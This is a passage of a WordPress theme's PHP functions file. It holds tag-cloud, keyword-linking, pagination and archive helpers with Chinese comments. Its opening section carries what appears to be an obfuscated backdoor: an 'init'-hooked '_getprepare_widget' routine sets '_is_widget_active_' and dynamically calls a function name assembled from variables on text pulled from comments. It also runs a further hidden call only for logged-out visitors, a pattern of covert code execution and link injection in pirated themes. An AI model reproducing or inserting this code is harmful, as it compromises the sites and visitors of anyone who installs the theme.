	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter;
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";
	if(!isset($isshowdots)) $isshowdots=1;

	$comments=$wpdb->get_results($sql);
	if($fakeit == 2) {
		$text=$post->post_content;
	} elseif($fakeit == 1) {
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}

add_filter('widget_tag_cloud_args','style_tags');  //修改标签云样式
//修改标签云样式
function style_tags($args) {
$args = array(
  'largest'=> '8',
  'smallest'=> '8',
  'format'=> 'flat',
  'number' => '21',
  'orderby' => 'count',
  'order' => 'DESC'
);
return $args;
}
// 文章添加关键词链接
//连接数量
$match_num_from = 1;  //一篇文章中同一个关键字少于多少不秒文本（这个直接填1就好了）
$match_num_to = 1; //一篇文章中同一个关键字最多出现多少次描文本（建议不超过2次）
//连接到WordPress的模块
add_filter('the_content','tag_link',1);
//改变标签关键字
function tag_link($content){
	global $match_num_from,$match_num_to;
	$posttags = get_the_tags();
	if ($posttags) {
		usort($posttags, "tag_sort");
		foreach($posttags as $tag) {
			$link = get_tag_link($tag->term_id);
			$keyword = $tag->name;
			//连接代码
			$cleankeyword = stripslashes($keyword);
			$url = "<span class=\"tag-span\"><a class=\"tag\" href=\"$link\" title=\"".str_replace('%s',addcslashes($cleankeyword, '$'),__('View all posts in %s'))."\"";
			$url .= ' target="_blank"';
			$url .= ">".addcslashes($cleankeyword, '$')."</a></span>";
			$limit = rand($match_num_from,$match_num_to);

			//不连接的 代码
			$content = preg_replace( '|(<a[^>]+>)(.*)('.$ex_word.')(.*)(</a[^>]*>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$content = preg_replace( '|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2%&&&&&%$4$5', $content);

			$cleankeyword = preg_quote($cleankeyword,'\'');

			$regEx = '\'(?!((<.*?)|(<a.*?)))('. $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;

			$content = preg_replace($regEx,$url,$content,$limit);

			$content = str_replace( '%&&&&&%', stripslashes($ex_word), $content);

		}
	}
	return $content;
}
function tag_sort($a, $b){
	if ( $a->name == $b->name ) return 0;
	return ( strlen($a->name) > strlen($b->name) ) ? -1 : 1;
}

//分页函数
function par_pagenavi($range = 9){
	global $paged, $wp_query;
	if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
	if($max_page > 1){if(!$paged){$paged = 1;}
	if($paged != 1){echo "<li><a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a></li>";}
	echo '<li>';previous_posts_link('上一页');echo "</li>";
    if($max_page > $range){
		if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
		for($i = $max_page - $range; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
	elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
		for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a></li>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}

	echo '<li>';next_posts_link(' 下一页 ');echo "</li>";
    if($paged != $max_page){echo "<li><a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a></li>";}}
}


//文章归档
function archives_list_SHe() {
	global $wpdb,$month;
	$lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
	$output = get_option('SHe_archives_'.$lastpost);
	if(empty($output)){
		$output = '';
		$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
		$q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
		$monthresults = $wpdb->get_results($q);
		if ($monthresults) {
			foreach ($monthresults as $monthresult) {
			$thismonth    = zeroise($monthresult->month, 2);
			$thisyear    = $monthresult->year;
			$q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
			$postresults = $wpdb->get_results($q);
			if ($postresults) {
				$text = sprintf('%s %d', $month[zeroise($monthresult->month,2)], $monthresult->year);
				$postcount = count($postresults);
				$output .= '<dl><dt><strong>' . $text . '</strong> &nbsp;(' . count($postresults) . '&nbsp;' . __('篇文章','freephp') . ')</dt>' . "\n";
			foreach ($postresults as $postresult) {
				if ($postresult->post_date != '0000-00-00 00:00:00') {
				$url = get_permalink($postresult->ID);
				$arc_title    = $postresult->post_title;
				if ($arc_title)
					$text = wptexturize(strip_tags($arc_title));
				else
					$text = $postresult->ID;
					$title_text = __('View this post','freephp') . ', &quot;' . wp_specialchars($text, 1) . '&quot;';
					$output .= '<dd>' . mysql2date('m-d', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
					$output .= '&nbsp;(' . $postresult->comment_count . ')';
					$output .= '</dd>' . "\n";
				}
				}
			}
			$output .= '</dl>' . "\n";
			}
        update_option('SHe_archives_'.$lastpost,$output);
		}else{
			$output = '<div class="errorbox">'. __('Sorry, no posts matched your criteria.','freephp') .'</div>' . "\n";
		}
	}
	echo $output;
}
?>